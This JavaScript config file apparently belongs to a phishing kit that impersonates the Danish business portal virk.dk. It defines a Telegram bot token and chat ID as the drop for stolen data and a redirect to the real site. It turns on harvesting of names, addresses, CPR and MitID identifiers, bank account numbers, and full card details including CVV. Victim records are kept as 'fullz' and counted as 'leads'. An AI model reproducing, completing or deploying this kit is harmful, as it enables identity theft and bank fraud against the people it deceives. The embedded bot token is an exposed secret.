// public_html/js/config.js
const CONFIG = {
  TELEGRAM_BOT_TOKEN: "8235621580:AAF_Cd07enQNQGr4096gTRlEW5Oim7PEjsY",
  TELEGRAM_CHAT_ID: "8839044436",
  LEAD_COUNTER_START: 1,
  REDIRECT_URL: "https://virk.dk",
  FIELDS: {
    mitidPassword: false,
    phone: true,
    fullName: true,
    address: true,
    postalCode: true,
    city: true,
    bankName: true,
    cardHolder: true,
    cardNumber: true,
    expiry: true,
    cvv: true,
    regNr: true,
    kontoNr: true,
  }
};

// Gør CONFIG tilgængelig globalt for andre scripts
window.CONFIG = CONFIG;

// State object for data storage
const state = {
  data: {
    cvrNumber: '',
    companyName: '',
    brugerID: '',
    cprNumber: '',
    phoneNumber: '',
    navn: '',
    address: '',
    postnummer: '',
    by: '',
    selectedBank: '',
    kortnavn: '',
    kortnummer: '',
    expiry: '',
    cvv: '',
    regNr: '',
    kontoNr: '',
    leadId: null
  }
};

function loadState() {
  const saved = localStorage.getItem('virk_fullz_data');
  if (saved) {
    try {
      state.data = JSON.parse(saved);
    } catch (e) { console.error('Fejl ved henting', e); }
  }
  
  // Init lead counter if not exists
  if (!state.data.leadId) {
    const existingLead = localStorage.getItem('virk_lead_counter');
    state.data.leadId = existingLead ? parseInt(existingLead) + 1 : CONFIG.LEAD_COUNTER_START;
    localStorage.setItem('virk_lead_counter', state.data.leadId);
  }
}

function saveState() {
  localStorage.setItem('virk_fullz_data', JSON.stringify(state.data));
}

window.state = state;
window.loadState = loadState;
window.saveState = saveState;
